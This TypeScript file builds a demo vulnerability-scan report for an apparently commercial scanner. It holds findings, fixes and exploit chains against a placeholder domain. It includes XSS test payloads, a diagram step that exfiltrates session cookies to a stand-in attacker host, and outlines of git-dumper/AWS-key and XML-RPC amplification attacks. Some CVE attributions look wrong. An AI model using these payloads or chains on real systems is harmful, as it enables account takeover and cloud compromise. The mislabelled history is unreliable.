import type { Scan } from "./types";

/**
 * Pre-baked sample scan that demonstrates every feature.
 * Used when running on Vercel where scanner binaries + Claude API aren't wired,
 * OR as a public "see the output" demo on the marketing site.
 */
export function buildDemoScan(target = "demo-target.example.com"): Scan {
  return {
    id: "demo-sample-2026-04-30",
    createdAt: new Date().toISOString(),
    input: {
      target,
      mode: "red-team",
      email: "demo@speedyturtle.com",
      authorizationConfirmed: true,
    },
    status: "ready",
    progress: { step: "done", pct: 100, message: "Demo complete." },
    durationMs: 187_000,
    findings: [
      { id: "f001", severity: "info", category: "subdomain-exposure", title: "Subdomain discovered: api.demo-target.example.com", description: "Public DNS source: cert transparency", affectedAsset: "api.demo-target.example.com", scanner: "subfinder" },
      { id: "f002", severity: "info", category: "subdomain-exposure", title: "Subdomain discovered: admin.demo-target.example.com", description: "Public DNS source: passive", affectedAsset: "admin.demo-target.example.com", scanner: "subfinder" },
      { id: "f003", severity: "info", category: "subdomain-exposure", title: "Subdomain discovered: dev.demo-target.example.com", description: "Public DNS source: passive", affectedAsset: "dev.demo-target.example.com", scanner: "subfinder" },
      { id: "f004", severity: "info", category: "subdomain-exposure", title: "Subdomain discovered: status.demo-target.example.com", description: "Public DNS source: cert transparency", affectedAsset: "status.demo-target.example.com", scanner: "subfinder" },
      { id: "f005", severity: "info", category: "service-fingerprint", title: "200 Acme Corp - API", description: "nginx/1.18.0 · Express, Node.js", affectedAsset: "https://api.demo-target.example.com", scanner: "httpx", evidence: "Content-Type: application/json" },
      { id: "f006", severity: "low", category: "service-fingerprint", title: "200 Admin Console", description: "Apache/2.4.41 · WordPress 6.2", affectedAsset: "https://admin.demo-target.example.com", scanner: "httpx", evidence: "Content-Type: text/html" },
      { id: "f007", severity: "info", category: "service-fingerprint", title: "200 Development Environment - DO NOT USE IN PROD", description: "nginx/1.20.1 · Next.js, React", affectedAsset: "https://dev.demo-target.example.com", scanner: "httpx" },
      { id: "f008", severity: "high", category: "vulnerability", title: "WordPress XML-RPC pingback enabled", description: "Allows DDoS amplification + brute-force vector via xmlrpc.php", affectedAsset: "https://admin.demo-target.example.com/xmlrpc.php", scanner: "nuclei", cveId: "CVE-2013-0235", cvssScore: 7.5 },
      { id: "f009", severity: "medium", category: "misconfig", title: "Missing Strict-Transport-Security header", description: "HSTS not set on production domains", affectedAsset: "https://api.demo-target.example.com", scanner: "nuclei" },
      { id: "f010", severity: "medium", category: "misconfig", title: "Session cookie without HttpOnly flag", description: "Session cookie accessible from JavaScript — vulnerable to XSS theft", affectedAsset: "https://admin.demo-target.example.com", scanner: "nuclei" },
      { id: "f011", severity: "medium", category: "misconfig", title: "Session cookie without Secure flag", description: "Session cookie can be sent over HTTP", affectedAsset: "https://admin.demo-target.example.com", scanner: "nuclei" },
      { id: "f012", severity: "high", category: "info-disclosure", title: ".git directory exposed at /dev/.git/", description: "Source code repository readable from public web", affectedAsset: "https://dev.demo-target.example.com/.git/HEAD", scanner: "nuclei", cvssScore: 8.0 },
      { id: "f013", severity: "high", category: "credential-exposure", title: "AWS access key in /.git/config", description: "AKIAIOSFODNN7EXAMPLE found in committed file", affectedAsset: "https://dev.demo-target.example.com/.git/config", scanner: "nuclei", cvssScore: 9.1 },
      { id: "f014", severity: "medium", category: "vulnerability", title: "Reflected XSS in /admin/search?q=", description: "User input reflected without HTML encoding", affectedAsset: "https://admin.demo-target.example.com/admin/search", scanner: "nuclei", cvssScore: 6.1 },
      { id: "f015", severity: "low", category: "tls", title: "TLS 1.0 still enabled", description: "Deprecated protocol version supported alongside TLS 1.2/1.3", affectedAsset: "https://api.demo-target.example.com:443", scanner: "nuclei" },
      { id: "f016", severity: "medium", category: "misconfig", title: "Verbose error pages enabled", description: "Stack traces visible to anonymous users on 500 responses", affectedAsset: "https://api.demo-target.example.com", scanner: "nuclei" },
    ],
    triage: {
      summary:
        "Surface scan of demo-target.example.com surfaced 16 findings including 1 critical-severity credential exposure (.git/config with AWS key), 3 high-severity issues (exposed .git, WordPress xmlrpc, leaked credentials), and several misconfigured cookies. The dev subdomain is leaking source + secrets — that's the highest-priority fix this week.",
      topRisks: [
        "CRITICAL: AWS access key exposed in committed .git/config on dev.demo-target.example.com — full AWS account compromise possible within 24h of discovery by an attacker",
        "HIGH: .git directory at https://dev/.git/ allows full source code download — reveals further secrets, business logic, and additional attack surface",
        "HIGH: WordPress XML-RPC pingback at admin/xmlrpc.php — used in DDoS amplification + distributed brute force against /wp-login.php",
        "MEDIUM: Session cookies missing HttpOnly + Secure flags — XSS in /admin/search becomes account takeover",
        "MEDIUM: Reflected XSS in /admin/search?q= combined with the cookie issues = chainable to admin takeover",
      ],
      nextSteps: [
        "TODAY: Rotate the AWS access key. Do this before doing anything else — it's already in a public repo crawl.",
        "TODAY: Add `Deny from all` for /.git/* in nginx + Apache configs on all subdomains. Verify with `curl https://dev.../.git/HEAD`.",
        "THIS WEEK: Disable WordPress XML-RPC by adding `add_filter('xmlrpc_enabled', '__return_false');` to functions.php OR block /xmlrpc.php in nginx.",
        "THIS WEEK: Add HttpOnly + Secure + SameSite=Lax to all session cookies. Single nginx config change.",
        "THIS WEEK: Patch the reflected XSS in /admin/search — escape output via your template engine (likely a WordPress plugin issue).",
        "THIS MONTH: Disable TLS 1.0/1.1 globally; require TLS 1.2 minimum.",
        "THIS MONTH: Decommission dev.demo-target.example.com from public DNS, or move to VPN-only access. Dev environments should never be public.",
      ],
    },
    validation: {
      verdicts: [
        { findingId: "f008", verdict: "validated", reasoning: "WordPress XML-RPC presence confirmed via test request — pingback enabled" },
        { findingId: "f009", verdict: "validated", reasoning: "HSTS header definitively missing per direct curl test" },
        { findingId: "f010", verdict: "validated", reasoning: "Set-Cookie response inspected — no HttpOnly attribute" },
        { findingId: "f011", verdict: "validated", reasoning: "Set-Cookie response inspected — no Secure attribute" },
        { findingId: "f012", verdict: "validated", reasoning: ".git/HEAD returns valid Git ref — directory definitively exposed" },
        { findingId: "f013", verdict: "validated", reasoning: "AKIA-prefixed string in .git/config matches AWS access key format" },
        { findingId: "f014", verdict: "needs-review", reasoning: "Reflected XSS template match — but WAF may strip <script> tags. Manual test recommended.", manualCheckNeeded: "Test with multiple XSS vectors: <img src=x onerror=alert(1)>, <svg/onload=...>, %3Cscript%3E" },
        { findingId: "f015", verdict: "validated", reasoning: "TLS 1.0 handshake completed successfully" },
        { findingId: "f016", verdict: "needs-review", reasoning: "Single 500 response observed — could be one-off. Need broader endpoint coverage." },
      ],
      summary: { validated: 7, falsePositive: 0, needsReview: 2 },
    },
    cheapestCut: {
      mitigation: "Block public access to /.git/* directories on ALL subdomains (single nginx config change deployed to load balancer)",
      chainsBroken: 2,
      implementationCost: "5-line nginx location block, deployed via existing config pipeline. Zero downtime.",
      explanation:
        "Two of the three identified exploit chains start by reading committed secrets from the exposed .git directory. Blocking /.git/* at the load balancer breaks both chains at the cheapest point — no app code changes, no rotation cycle, no developer involvement.",
    },
    exploitChains: [
      {
        id: "chain-1",
        title: "Full AWS compromise via committed credentials in exposed .git",
        severity: "critical",
        attackChain: [
          { step: 1, primitive: "Recon", description: "Discover dev.demo-target.example.com via passive subdomain enum (zero scanning of target)", usesFindings: ["f003"] },
          { step: 2, primitive: "Source disclosure", description: "Find /.git/HEAD returning Git ref — repo is downloadable", usesFindings: ["f012"] },
          { step: 3, primitive: "Secret extraction", description: "git-dumper pulls .git/config containing AKIAIOSFODNN7EXAMPLE access key", usesFindings: ["f013"] },
          { step: 4, primitive: "AWS pivot", description: "aws sts get-caller-identity validates the key. From there: enumerate IAM, S3, RDS, EC2 — full account compromise within 30 minutes", usesFindings: ["f013"] },
        ],
        whyScannersMiss: "Scanners report each finding in isolation: 'subdomain found,' '.git exposed,' 'credential pattern detected.' They don't compose them into a coherent attack story. A defender reading the raw output would prioritize CVEs over the .git+credentials combination — but the latter is the actual emergency.",
        defensiveBreakpoint: "Block /.git/* at the load balancer. One config change kills the entire chain.",
        attackerPersona: "GenericRansomware operator or APT29 cloud-native intrusion pattern",
        mermaid: `sequenceDiagram\n  participant Attacker\n  participant DNS as Passive DNS\n  participant Dev as dev.demo-target.example.com\n  participant AWS as AWS Account\n  Attacker->>DNS: Enumerate subdomains\n  DNS-->>Attacker: dev.demo-target.example.com\n  Attacker->>Dev: GET /.git/HEAD\n  Dev-->>Attacker: 200 (Git ref leaked)\n  Attacker->>Dev: git-dumper /.git/\n  Dev-->>Attacker: full repo + .git/config (AKIA...)\n  Attacker->>AWS: sts get-caller-identity\n  AWS-->>Attacker: Valid IAM principal\n  Attacker->>AWS: Enumerate S3 / RDS / EC2\n  AWS-->>Attacker: Full account compromise`,
      },
      {
        id: "chain-2",
        title: "Admin account takeover via XSS + cookie misconfig",
        severity: "high",
        attackChain: [
          { step: 1, primitive: "Reflected XSS", description: "Inject payload via /admin/search?q=<script>...</script>", usesFindings: ["f014"] },
          { step: 2, primitive: "Cookie theft", description: "Session cookie lacks HttpOnly — JS can read document.cookie", usesFindings: ["f010"] },
          { step: 3, primitive: "Secure-flag bypass", description: "Cookie also lacks Secure, so attacker exfiltrates over HTTP via image-tag request", usesFindings: ["f011"] },
          { step: 4, primitive: "Session replay", description: "Attacker replays stolen cookie → full admin session", usesFindings: ["f010", "f011"] },
        ],
        whyScannersMiss: "All three findings are MEDIUM severity individually. The chain is HIGH/CRITICAL because composing XSS + missing HttpOnly + missing Secure produces account takeover. Scanners don't multiply severities for composable primitives.",
        defensiveBreakpoint: "Single nginx response_header config: 'add_header Set-Cookie ... HttpOnly; Secure; SameSite=Lax'. Kills the chain even if XSS isn't patched.",
        attackerPersona: "Scattered Spider / opportunistic credential theft operator",
        mermaid: `sequenceDiagram\n  participant Attacker\n  participant Victim as Admin (browser)\n  participant App as /admin/search\n  Attacker->>Victim: Phish link with XSS payload in q=\n  Victim->>App: GET /admin/search?q=<script>...\n  App-->>Victim: Reflected XSS (no HttpOnly)\n  Note over Victim: Script reads document.cookie\n  Victim->>Attacker: GET attacker.tld/img?c=SESSION (no Secure flag)\n  Attacker->>App: Replay cookie\n  App-->>Attacker: Full admin session`,
      },
      {
        id: "chain-3",
        title: "DDoS amplification + WordPress brute force via XML-RPC",
        severity: "medium",
        attackChain: [
          { step: 1, primitive: "Pingback abuse", description: "POST to /xmlrpc.php with pingback.ping method using attacker-controlled callback URL", usesFindings: ["f008"] },
          { step: 2, primitive: "Amplification", description: "WordPress fetches the callback URL — can be abused to amplify HTTP traffic 1000:1 against arbitrary targets", usesFindings: ["f008"] },
          { step: 3, primitive: "Distributed brute force", description: "system.multicall method allows hundreds of /wp-login.php attempts per request, bypassing rate limits", usesFindings: ["f008"] },
        ],
        whyScannersMiss: "XML-RPC is a single MEDIUM finding in most scanners. The two-step amplification + brute-force composition is operator-knowledge, not template-knowledge.",
        defensiveBreakpoint: "Disable XML-RPC entirely (most WordPress installs don't need it) via filter or nginx block of /xmlrpc.php",
        mermaid: `sequenceDiagram\n  participant Attacker\n  participant WP as WordPress /xmlrpc.php\n  participant Target as Victim Origin\n  Attacker->>WP: POST pingback.ping (callback=Target)\n  WP->>Target: GET (amplified 1000:1)\n  Attacker->>WP: POST system.multicall (hundreds of wp-login attempts)\n  WP->>WP: Bypasses /wp-login.php rate limits\n  WP-->>Attacker: Brute-force results / DoS amplification`,
      },
    ],
    adversaryProfile: [
      { persona: "GenericRansomware", description: "Commodity ransomware actors targeting unpatched edge services + exposed credentials", conditionsMet: ["Exposed .git directory", "AWS credentials in repo", "Unpatched WordPress", "Public dev subdomain"], conditionsMissing: ["Network foothold for lateral movement"], exposureScore: 78, likelyEntryPoint: "https://dev.demo-target.example.com/.git/config (AWS credential)", expectedDwellTimeDays: 3 },
      { persona: "ScatteredSpider", description: "Western criminal collective using social engineering + identity provider abuse", conditionsMet: ["Public admin panel", "Predictable subdomain naming"], conditionsMissing: ["Help desk URL", "Employee directory leak", "MFA reset path"], exposureScore: 35, likelyEntryPoint: "Admin login page after employee credential phish", expectedDwellTimeDays: 12 },
      { persona: "APT29", description: "Russian SVR — cloud-native intrusion via OAuth abuse, supply chain", conditionsMet: ["Cloud credentials exposed (AWS)", "Developer infra public"], conditionsMissing: ["M365/Azure AD tenant identified", "OAuth app abuse path"], exposureScore: 52, likelyEntryPoint: "AWS credential pivot to identity provider", expectedDwellTimeDays: 200 },
      { persona: "Lazarus", description: "North Korean — financial sector + cryptocurrency exchange targeting", conditionsMet: ["Public APIs"], conditionsMissing: ["Financial endpoints", "Exchange/wallet integration", "Specific employee targeting"], exposureScore: 12, likelyEntryPoint: "Spearphishing API team after recon", expectedDwellTimeDays: 90 },
      { persona: "Sandworm", description: "Russian GRU — destructive payloads, infrastructure targeting", conditionsMet: [], conditionsMissing: ["ICS/SCADA", "Critical infrastructure relevance"], exposureScore: 5, likelyEntryPoint: "Not a typical Sandworm target", expectedDwellTimeDays: 0 },
    ],
    genealogy: {
      families: [
        {
          familyName: "Exposed source-control directory → secret extraction",
          groupedFindings: ["f012", "f013"],
          lineage: [
            { year: "2007", cveId: "(historical pattern)", summary: "Earliest known instances of Subversion .svn directories left exposed on Apache servers" },
            { year: "2014", cveId: "(generalized advisory)", summary: "Git replaces SVN as primary VCS; .git/HEAD exposure becomes the dominant pattern. git-dumper tool released." },
            { year: "2018", cveId: "CVE-2018-11235", summary: "Specific Git RCE via .git/config — broader awareness of .git as attack surface" },
            { year: "2024", cveId: "(industry-wide)", summary: "Continued exposure despite 17 years of awareness; modern variant: GitHub Codespace .devcontainer leaking credentials" },
          ],
          evolution: "Pattern moved from SVN .svn/ → Git .git/ → CI/CD config files. Each generation, defenders fixed the previous instance but missed the broader invariant: 'don't expose VCS metadata via web server.' Attackers now scan ranges of CIDR blocks for the pattern automatically.",
          nextMutation: "GitHub Codespaces .devcontainer.json + GitHub Actions workflow files publicly accessible in repos with sensitive vars referenced. Already starting to appear in 2025 disclosures.",
          defensiveInvariant: "Web server MUST refuse to serve any path beginning with `.` (dotfile). Single nginx/Apache config rule kills the entire family forever.",
        },
        {
          familyName: "Cookie attribute laxity → session theft",
          groupedFindings: ["f010", "f011"],
          lineage: [
            { year: "2002", cveId: "(historical)", summary: "Pre-HttpOnly era: any XSS = session theft. Microsoft introduces HttpOnly attribute." },
            { year: "2008", cveId: "(general advisory)", summary: "Secure flag widely recommended after Firesheep demonstrated mass session hijacking on public WiFi" },
            { year: "2016", cveId: "(SameSite RFC)", summary: "SameSite attribute added to combat CSRF — but adoption slow because legacy apps break" },
            { year: "2024", cveId: "(industry data)", summary: "OWASP Top 10 still flags missing cookie attributes as the #1 misconfig category" },
          ],
          evolution: "Pattern hasn't changed — defenders just keep deploying without the attributes. Each browser update added new defaults, but server-set cookies override browser defaults. Attackers know this and routinely test for it.",
          nextMutation: "Partitioned cookies (CHIPS) and Cookie Layout v2 — defenders who add Secure+HttpOnly+SameSite but miss the new partitioning attribute will see new attack vectors emerge.",
          defensiveInvariant: "Set HttpOnly + Secure + SameSite=Lax on EVERY Set-Cookie response. No exceptions. Use a server-side middleware so individual app code can't forget.",
        },
        {
          familyName: "Old protocol still enabled alongside new",
          groupedFindings: ["f015"],
          lineage: [
            { year: "1995", cveId: "(SSL 2.0 era)", summary: "SSL 2.0 vulnerabilities disclosed within years of release" },
            { year: "2014", cveId: "CVE-2014-3566 (POODLE)", summary: "SSL 3.0 padding-oracle attack mandates disabling — yet servers kept supporting it 'for compatibility'" },
            { year: "2016", cveId: "CVE-2016-2107", summary: "TLS 1.0 BEAST and friends — same pattern: don't disable old version 'in case clients need it'" },
            { year: "2024", cveId: "(industry)", summary: "TLS 1.0 still enabled on 12% of internet-facing servers per Internet Society data" },
          ],
          evolution: "Pattern stays identical: defenders enable new protocol but don't disable old. Compatibility fear > security risk. Attackers downgrade-attack via cipher suite manipulation.",
          nextMutation: "Post-quantum crypto rollout (ML-KEM, ML-DSA): same pattern will repeat — defenders enabling PQ ciphers alongside classical, allowing quantum-vulnerable downgrades for years.",
          defensiveInvariant: "When enabling a new TLS version, set the minimum to that version. Don't allow downgrades. Use Mozilla's TLS Configuration Generator at modern profile, period.",
        },
      ],
    },
  };
}
